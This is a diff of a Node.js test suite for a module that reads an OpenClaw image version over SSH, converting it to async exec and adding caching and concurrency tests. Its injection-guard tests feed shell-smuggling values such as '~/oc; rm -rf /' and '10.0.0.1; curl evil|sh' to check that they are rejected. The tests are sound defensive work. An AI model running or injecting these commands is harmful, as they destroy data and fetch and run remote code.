@@ -5,7 +5,9 @@
 
 const { describe, it, beforeEach, afterEach } = require('node:test');
 const assert = require('node:assert/strict');
-const { execSync } = require('node:child_process');
+const { exec } = require('node:child_process');
+const { promisify } = require('node:util');
+const execAsync = promisify(exec);
 const { setLevel } = require('../lib/logger');
 
 setLevel('error');
@@ -68,75 +70,160 @@ describe('openclaw-version (#296)', () => {
       id: 'c1', host: 'h', sshUser: 'u', sshKeyPath: '~/.ssh/k', instanceDir: '~/openclaw', ...over
     });
 
-    beforeEach(() => { ocv._cache.clear(); });
-    afterEach(() => { ocv._internal.exec = execSync; ocv._cache.clear(); });
+    beforeEach(() => { ocv._cache.clear(); ocv._inflight.clear(); });
+    afterEach(() => { ocv._internal.execAsync = execAsync; ocv._cache.clear(); ocv._inflight.clear(); });
 
-    it('reads + parses the version over SSH and caches it', () => {
+    it('reads + parses the version over SSH and caches it', async () => {
       let calls = 0;
-      ocv._internal.exec = () => { calls++; return 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28\n'; };
-      const r1 = ocv.fetchVersion(conn());
+      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28\n' }; };
+      const r1 = await ocv.fetchVersion(conn());
       assert.equal(r1.version, '2026.5.28');
       assert.equal(r1.error, null);
       assert.equal(r1.cached, false);
-      const r2 = ocv.fetchVersion(conn());
+      const r2 = await ocv.fetchVersion(conn());
       assert.equal(r2.version, '2026.5.28');
       assert.equal(r2.cached, true);
       assert.equal(calls, 1, 'second call served from cache (no second ssh)');
     });
 
-    it('force bypasses the cache', () => {
+    it('force bypasses the cache', async () => {
       let calls = 0;
-      ocv._internal.exec = () => { calls++; return 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.6'; };
-      ocv.fetchVersion(conn());
-      ocv.fetchVersion(conn(), { force: true });
+      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.6' }; };
+      await ocv.fetchVersion(conn());
+      await ocv.fetchVersion(conn(), { force: true });
       assert.equal(calls, 2);
     });
 
-    it('no instanceDir → error and no ssh attempted', () => {
+    it('no instanceDir → error and no ssh attempted', async () => {
       let called = false;
-      ocv._internal.exec = () => { called = true; return ''; };
-      const r = ocv.fetchVersion(conn({ instanceDir: null }));
+      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
+      const r = await ocv.fetchVersion(conn({ instanceDir: null }));
       assert.equal(r.version, null);
       assert.match(r.error, /no instanceDir/);
       assert.equal(called, false);
     });
 
-    it('unsafe instanceDir → error and no ssh attempted (injection guard)', () => {
+    it('unsafe instanceDir → error and no ssh attempted (injection guard)', async () => {
       let called = false;
-      ocv._internal.exec = () => { called = true; return ''; };
-      const r = ocv.fetchVersion(conn({ instanceDir: '~/oc; rm -rf /' }));
+      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
+      const r = await ocv.fetchVersion(conn({ instanceDir: '~/oc; rm -rf /' }));
       assert.equal(r.version, null);
       assert.match(r.error, /unsafe/);
       assert.equal(called, false);
     });
 
-    it('unsafe host/sshUser/sshKeyPath → error and no ssh attempted (#314 injection guard)', () => {
+    it('unsafe host/sshUser/sshKeyPath → error and no ssh attempted (#314 injection guard)', async () => {
       let called = false;
-      ocv._internal.exec = () => { called = true; return ''; };
+      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
       for (const [field, bad, re] of [
         ['host', '10.0.0.1; curl evil|sh', /host/],
         ['sshUser', 'a$(whoami)', /sshUser/],
         ['sshKeyPath', '~/.ssh/k`id`', /sshKeyPath/]
       ]) {
-        const r = ocv.fetchVersion(conn({ [field]: bad }));
+        const r = await ocv.fetchVersion(conn({ [field]: bad }));
         assert.equal(r.version, null, `${field} should block`);
         assert.match(r.error, re);
       }
       assert.equal(called, false, 'no ssh runs for an unsafe-shaped target');
     });
 
-    it('ssh failure → surfaces an error, no crash', () => {
-      ocv._internal.exec = () => { const e = new Error('boom'); e.stderr = 'conn refused'; throw e; };
-      const r = ocv.fetchVersion(conn());
+    it('ssh failure → surfaces an error, no crash', async () => {
+      ocv._internal.execAsync = async () => { const e = new Error('boom'); e.stderr = 'conn refused'; throw e; };
+      const r = await ocv.fetchVersion(conn());
       assert.equal(r.version, null);
       assert.match(r.error, /ssh read failed/);
     });
 
-    it('image line missing in .env → version null with a reason', () => {
-      ocv._internal.exec = () => 'SOMETHING=else\n';
-      const r = ocv.fetchVersion(conn());
+    it('image line missing in .env → version null with a reason', async () => {
+      ocv._internal.execAsync = async () => ({ stdout: 'SOMETHING=else\n' });
+      const r = await ocv.fetchVersion(conn());
       assert.equal(r.version, null);
       assert.match(r.error, /not found/);
+    });
+
+    it('does not block the event loop while ssh is pending (hard-reboot hang)', async () => {
+      // An unreachable host used to hold execSync for the whole connect
+      // timeout, freezing every WebSocket. A timer must run WHILE the read is
+      // still unsettled — checking order, not just that the timer ran.
+      let release;
+      ocv._internal.execAsync = () => new Promise((resolve) => { release = resolve; });
+      let settled = false;
+      const pending = ocv.fetchVersion(conn());
+      pending.then(() => { settled = true; });
+      const pendingWhenTimerRan = await new Promise((resolve) => setTimeout(() => resolve(!settled), 5));
+      assert.equal(pendingWhenTimerRan, true, 'a timer ran while the ssh read was still in flight');
+      release({ stdout: 'OPENCLAW_IMAGE=openclaw:edge' });
+      assert.equal((await pending).version, 'edge');
+      assert.equal(settled, true);
+    });
+
+    it('concurrent callers share one ssh read', async () => {
+      let calls = 0;
+      const releases = [];
+      ocv._internal.execAsync = () => { calls++; return new Promise((resolve) => { releases.push(resolve); }); };
+      const a = ocv.fetchVersion(conn());
+      const b = ocv.fetchVersion(conn());
+      const c = ocv.fetchVersion(conn(), { force: true });
+      for (const release of releases) release({ stdout: 'OPENCLAW_IMAGE=openclaw:qmd' });
+      const results = await Promise.all([a, b, c]);
+      assert.equal(calls, 1, 'one ssh for three concurrent callers');
+      for (const r of results) assert.equal(r.version, 'qmd');
+      assert.equal(ocv._inflight.size, 0, 'in-flight entry cleared once settled');
+    });
+
+    it('a failed read backs off for FAILURE_TTL_MS, then retries; force retries at once', async () => {
+      let calls = 0;
+      ocv._internal.execAsync = async () => { calls++; throw Object.assign(new Error('timeout'), { stderr: 'no route' }); };
+      const r1 = await ocv.fetchVersion(conn());
+      const r2 = await ocv.fetchVersion(conn());
+      assert.equal(calls, 1, 'a render inside the back-off does not start another ssh');
+      assert.equal(r2.cached, true);
+      assert.equal(r2.version, null);
+      assert.equal(r2.error, r1.error, 'the cached failure still carries its reason');
+      await ocv.fetchVersion(conn(), { force: true });
+      assert.equal(calls, 2, 'force bypasses the back-off');
+      ocv._cache.get('c1').fetchedAt -= ocv.FAILURE_TTL_MS + 1;
+      await ocv.fetchVersion(conn());
+      assert.equal(calls, 3, 'retried once the back-off lapses');
+      assert.ok(ocv.FAILURE_TTL_MS < ocv.TTL_MS);
+    });
+
+    it('a successful read is not cut short by the failure back-off', async () => {
+      let calls = 0;
+      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=openclaw:edge' }; };
+      await ocv.fetchVersion(conn());
+      ocv._cache.get('c1').fetchedAt -= ocv.FAILURE_TTL_MS + 1;
+      const r = await ocv.fetchVersion(conn());
+      assert.equal(calls, 1);
+      assert.equal(r.cached, true);
+      assert.equal(r.error, null);
+    });
+
+    it('a cached "image line missing" result keeps its reason', async () => {
+      let calls = 0;
+      ocv._internal.execAsync = async () => { calls++; return { stdout: 'SOMETHING=else\n' }; };
+      await ocv.fetchVersion(conn());
+      const r = await ocv.fetchVersion(conn());
+      assert.equal(calls, 1, 'not-found is a real answer, cached for the full TTL');
+      assert.equal(r.cached, true);
+      assert.equal(r.version, null);
+      assert.match(r.error, /not found/);
+    });
+
+    it('a read in flight when the connection is invalidated is not cached', async () => {
+      let calls = 0;
+      const releases = [];
+      ocv._internal.execAsync = () => { calls++; return new Promise((resolve) => { releases.push(resolve); }); };
+      const stale = ocv.fetchVersion(conn());
+      ocv.invalidate('c1'); // connection edited mid-read
+      const fresh = ocv.fetchVersion(conn({ instanceDir: '~/openclaw-new' }));
+      assert.equal(calls, 2, 'a read after invalidate does not join the stale one');
+      releases[0]({ stdout: 'OPENCLAW_IMAGE=openclaw:old' });
+      releases[1]({ stdout: 'OPENCLAW_IMAGE=openclaw:new' });
+      assert.equal((await stale).version, 'old');
+      assert.equal((await fresh).version, 'new');
+      assert.equal(ocv._cache.get('c1').version, 'new', 'only the post-invalidate read is cached');
+      assert.equal(ocv._inflight.size, 0);
     });
   });
 });
